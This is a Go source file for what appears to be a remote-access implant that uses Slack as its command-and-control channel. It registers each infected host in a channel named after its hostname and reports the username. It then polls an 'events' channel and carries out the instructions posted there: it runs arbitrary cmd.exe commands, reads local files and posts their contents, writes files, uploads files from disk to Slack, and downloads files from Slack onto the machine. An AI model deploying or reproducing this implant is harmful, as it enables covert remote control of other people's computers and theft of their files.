package main

import (
	"bufio"
	"bytes"
	"fmt"
	"log"
	"os"
	"os/exec"
	"os/user"
	"slices"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/slack-go/slack"
)

// TODO: Clean up code.

const ShellToUse = "cmd.exe"

var TeamID string
var channel_name string
var events []string

var attachment slack.Attachment

var id = uuid.New()

func main() {

	token := ""
	channelID := ""
	appToken := ""
	TeamID = ""

	// Create a new client to slack by giving token
	// Set debug to true while developing
	// Also add a ApplicationToken option to the client
	client := slack.New(token, slack.OptionDebug(false), slack.OptionAppLevelToken(appToken))

	hostname, _ := os.Hostname()
	computer_user, _ := user.Current()

	channel_name = strings.ToLower(hostname)
	fmt.Println("Trying: ", channel_name)

	channel_params := slack.CreateConversationParams{
		ChannelName: channel_name,
		IsPrivate:   false,
		TeamID:      TeamID,
	}

	new_channel, err := client.CreateConversation(channel_params)

	if err != nil {
		channel_id := GetChannelID(TeamID, channel_name, client)
		_, _, _, err := client.JoinConversation(channel_id)

		if err != nil {
			log.Fatal(err)
		}
	} else {
		fmt.Println("New channel created:", new_channel.Name)
	}

	attachment = slack.Attachment{}
	attachment.Text = fmt.Sprintf("Connected at: %s \n Connected with UUID: %s \n Hostname: %s \n User: %s \n In channel: %s", time.Now().Format(time.RFC850), id, hostname, computer_user.Username, channel_name)

	channelId, timestamp, err := client.PostMessage(
		channelID,
		slack.MsgOptionText("Bot Information: ", false),
		slack.MsgOptionAttachments(attachment),
		slack.MsgOptionAsUser(true),
	)

	if err != nil {
		log.Fatalf("%s\n", err)
	}

	log.Printf("Message successfully sent to Channel %s at %s\n", channelId, timestamp)

	for {
		LookupConfig(client)
		continue
	}

}

func LookupConfig(client *slack.Client) {

	var check_event bool
	var concurrent bool

	fmt.Println("Looking up config")
	// Check history of channel
	channel_id := GetChannelID(TeamID, "events", client)

	JoinChannel(channel_id, client)

	if channel_id != "" {
		messages := GetChannelHistory(channel_id, client)

		for _, message := range messages {
			scanner := bufio.NewScanner(strings.NewReader(message.Text))

			check, lines := CheckMessage(scanner)

			if check == true {
				check_event = CheckEvent(lines, events)
				concurrent = CheckRepeat(lines)
			}

			fmt.Println(events)

			if check_event == false {
				channel_id := GetChannelID(TeamID, channel_name, client)
				ReadOptions(lines, client, channel_id, concurrent)
			} else {
				fmt.Println("Already done event")
			}
		}
	}

	time.Sleep(15 * time.Second)
}

func DownloadFile(client *slack.Client, channelID string, filename string, outfile string) {
	// Specify the channel via id to list files
	remote_files_params := slack.ListFilesParameters{
		Channel: channelID,
	}

	// Get remote_files from channel
	remote_files, _, err := client.ListFiles(remote_files_params)

	if err != nil {
		log.Fatal(err)
	}

	for _, file := range remote_files {
		chkfilename := file.Name

		if chkfilename == filename {
			fmt.Println("Found file")
			preview := file.Preview             // Get the preview of the contents of the file
			WriteFileDownload(preview, outfile) // Write contents of file to output file on system
		}
	}
}

func UploadFile(client *slack.Client, file string, channelID string, filename string) {

	fd, err := os.Open(file)
	if err != nil {
		log.Fatal(err)
	}

	fd_stat, err := fd.Stat()
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println(channel_name)

	file_params := slack.UploadFileV2Parameters{
		File:     file,
		FileSize: int(fd_stat.Size()),
		Reader:   fd,
		Filename: filename,
		Title:    filename,
		Channel:  channelID,
	}

	_, err = client.UploadFileV2(file_params)

	if err != nil {
		log.Fatal(err)
	}
}

func ReadOptions(lines []string, client *slack.Client, id string, concurrent bool) {
	for _, line := range lines {
		split_result := SplitLine(line)
		if len(split_result) != 0 {
			if split_result[0] != "" { // Probably unnecessary, but just in case this error check should added
				ProcessOption(split_result, client, id, concurrent)
			}
		}
	}
}

func ProcessOption(option []string, client *slack.Client, id string, concurrent bool) {
	var config_option string
	var config_var string

	if option[0] != "" {
		config_var = option[0]
	}

	if option[1] != "" {
		config_option = option[1]
	}

	if config_var == "COMMAND" {
		err, result, err_string := RunCmd(config_option)

		if err != nil {
			attachment.Text = err_string
			attachment.Pretext = "Error of command"
		} else {
			// Send a message to the user
			attachment.Text = result
			attachment.Pretext = "Output of command"
			attachment.Color = "#3d3d3d"
		}

		// Send the message to the channel
		// The Channel is available in the event message
		_, _, err = client.PostMessage(id, slack.MsgOptionAttachments(attachment))
		if err != nil {
			log.Println("failed to post message: %w", err)
		}
	} else if config_var == "FILE_READ" {
		var output string
		lines := ReadFile(config_option)
		if len(lines) != 0 {
			for _, line := range lines {
				output += line + "\n"
			}

			// Send a message to the user
			attachment.Text = output
			attachment.Pretext = "Output of file read"
			attachment.Color = "#3d3d3d"

			// Send the message to the channel
			// The Channel is available in the event message
			_, _, err := client.PostMessage(id, slack.MsgOptionAttachments(attachment))
			if err != nil {
				log.Println("failed to post message: %w", err)
			}
		}
	} else if config_var == "FILE_WRITE" {
		WriteFile(config_option)
	} else if config_var == "EventName" && concurrent != true {
		events = append(events, config_option)
	} else if config_var == "FileUpload" && config_option != "" {
		UploadFile(client, config_option, id, config_option)
	} else if config_var == "FileDownload" && config_option != "" {
		file_config := SplitColonoscopy(config_option)
		DownloadFile(client, id, file_config[0], file_config[1])
	} else {
		log.Println("Unknown config given")
	}

}

func WriteFile(data string) {
	// Split on colon sign.
	result := SplitColonoscopy(data)

	if len(result) != 0 {

		file, err := os.OpenFile(result[1], os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644) // Create and open file to append to

		if err != nil {
			return
		}
		defer file.Close()

		if _, err := file.WriteString(strings.Replace(result[0], `\n`, "\n", -1)); err != nil { // Write data to file
			log.Println(err)
			return
		}
	}
}

func WriteFileDownload(data string, outfile string) {

	file, err := os.OpenFile(outfile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644) // Create and open file to append to

	if err != nil {
		return
	}
	defer file.Close()

	if _, err := file.WriteString(strings.Replace(data, `\n`, "\n", -1) + "\n"); err != nil { // Write data to file
		return
	}
}

func ReadFile(file string) []string {
	var lines []string

	data, err := os.Open(file) // Open the file

	if err != nil {
		log.Fatal(err)
	}
	defer data.Close()

	scanner := bufio.NewScanner(data) // Scan the contents of the file and append to buffer
	for scanner.Scan() {
		line := scanner.Text()
		lines = append(lines, line)
	}

	if err := scanner.Err(); err != nil {
		log.Println(err) // Print error if scanning is not done properly
	}

	return lines
}

func RunCmd(command string) (error, string, string) {
	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd := exec.Command(ShellToUse, "/C", command)
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()
	return err, stdout.String(), stderr.String()
}

func SplitLine(data string) []string {
	// Split on equal sign.
	result := strings.Split(data, "=")

	if len(result) != 0 {
		return result
	}
	return result
}

func SplitColonoscopy(data string) []string {
	// Split on equal sign.
	result := strings.Split(data, ":")

	if len(result) != 0 {
		return result
	}
	return result
}

func CheckEvent(lines []string, events []string) bool {

	var check bool

	for _, line := range lines {
		split_result := SplitLine(line)
		if split_result[0] == "EventName" {
			if slices.Contains(events, split_result[1]) {
				check = true
			} else {
				check = false
			}
		}

	}

	return check

}

func CheckRepeat(lines []string) bool {

	var concurrent bool

	for _, line := range lines {
		split_result := SplitLine(line)
		if split_result[0] == "Repeat" || split_result[0] == "Concurrent" {

			if split_result[1] == "True" {
				concurrent = true
			} else {
				concurrent = false
			}

		} else {
			concurrent = false // Probably unnecessary but it is past 2 AM and I don't care.
		}

	}

	return concurrent

}

func CheckMessage(scanner *bufio.Scanner) (bool, []string) {

	var event bool
	var lines []string

	for scanner.Scan() {
		fmt.Println("Scanner: ", scanner.Text())
		if scanner.Text() == "Event=True" {
			fmt.Println("Message is an event")
			event = true
		} else if event == true {
			lines = append(lines, scanner.Text())
		}
	}

	return event, lines
}

func JoinChannel(id string, client *slack.Client) {
	client.JoinConversation(id) // Join the channel
}

func GetChannelHistory(id string, client *slack.Client) []slack.Message {

	var messages []slack.Message

	// Retrieve history based on the channel id.
	history := slack.GetConversationHistoryParameters{
		ChannelID: id,
	}

	history_response, err := client.GetConversationHistory(&history)

	if err != nil {
		fmt.Println("GetChannelHistory: " + id)
		log.Fatal(err)
		return messages
	}

	messages = history_response.Messages

	return messages
}

func GetChannelID(TeamID string, channel_name string, client *slack.Client) string {
	conversation_params := slack.GetConversationsParameters{
		TeamID: TeamID,
	}

	var id string

	channels, _, err := client.GetConversations(&conversation_params)

	if err == nil {
		// Thanks I hate it.
		// Loop through the channels struct and check if the name matches the channel_name.
		// If it does assign the id to id variable.
		for _, channel := range channels {
			if channel.Name == channel_name {
				fmt.Printf("Channel ID of channel %s is %s\n", channel_name, channel.ID)
				id = channel.ID
			}
		}
	}

	return id
}

func Shellout(command string) (error, string, string) {
	var stdout bytes.Buffer
	var stderr bytes.Buffer

	cmd := exec.Command(ShellToUse, "/C", command)
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	err := cmd.Run()

	return err, stdout.String(), stderr.String()
}
